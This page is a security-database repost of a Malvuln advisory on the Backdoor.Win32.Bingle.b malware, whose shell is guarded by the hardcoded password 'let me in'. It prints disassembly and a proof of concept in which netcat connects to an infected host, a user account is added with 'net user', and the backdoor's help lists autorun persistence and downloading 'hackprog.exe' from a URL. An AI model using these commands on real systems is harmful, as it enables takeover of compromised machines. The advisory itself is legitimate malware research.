---
title: Backdoor.Win32.Bingle.b / Weak Hardcoded Credentials
url: https://cxsecurity.com/issue/WLB-2022100036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-14
fetch_date: 2025-10-03T19:47:46.015221
---

# Backdoor.Win32.Bingle.b / Weak Hardcoded Credentials

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Bingle.b / Weak Hardcoded Credentials** **2022.10.13**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/eacaa12336f50f1c395663fba92a4d32.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Threat: Backdoor.Win32.Bingle.b
Vulnerability: Weak Hardcoded Credentials
Description: The malware is packed using ASPack 2.11, listens on TCP port 22 and requires authentication. However, the password "let me in" is weak and hardcoded within the PE file. Unpacking the executable, easily reveals the cleartext password.
Family: Bingle
Type: PE32
MD5: eacaa12336f50f1c395663fba92a4d32
Vuln ID: MVID-2022-0643
Disclosure: 09/24/2022
004029A0 call sub\_4010E0
004029A5 add esp, 0Ch
004029A8 cmp eax, ebp
004029AA jge short loc\_4029CC
004029AC mov edi, [esp+eax\*4+230h+var\_21C]
004029B0 mov ecx, ebx
004029B2 xor eax, eax
004029B4 repne scasb
004029B6 not ecx
004029B8 sub edi, ecx
004029BA mov edx, ecx
004029BC mov esi, edi
004029BE mov edi, offset aLetMeIn ; "let me in"
Exploit/PoC:
C:\>nc64.exe x.x.x.x 22
let me in
Nt Shell 1.0 beta by bingle@email.com.cn
Indicator '#' is NTShell Server output.
Type ?help for support commands beyond cmd;
?use at command line for support parameters.
Use 'net helpmsg xxx' to see detail message of Error Code.
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Users\Victim\Desktop>whoami
whoami
desktop-2c3iqho\victim
C:\Users\Victim\Desktop>net user hyp3rlinx 1313 /add
net user hyp3rlinx 1313 /add
The command completed successfully.
C:\Users\Victim\Desktop>?help
#?autorun [name file "args"] --- add the [file] to autorun when reboot,
[file] default is ntshell.exe
#?canceldata --- abort the previous file transfer command
#?chdir <dir> --- change the server current dir to <dir>,
can be UNC(share) name
#?get <file> [port] --- GET <file> from server, server use [port] to tranfer
#?help --- show this HELP
#?httpget <url> <file> --- get the 'file' from 'url',
eg:httpget http://192.168.0.1 /hackdir/hackprog.exe
#?pskill PID --- Kill the Process with PID
#?pslist --- List the all process in system
#?put <file> [port] --- PUT <file> to server, server use [port] to tranfer
#?quit --- QUIT the telnetd program
#?restart [<user> [pass]] --- restart the shell as [user] in stead of
IUSR\_computer if [user] specified, no need to reconnect
#?sysinfor --- Get the System os information
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 -1

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top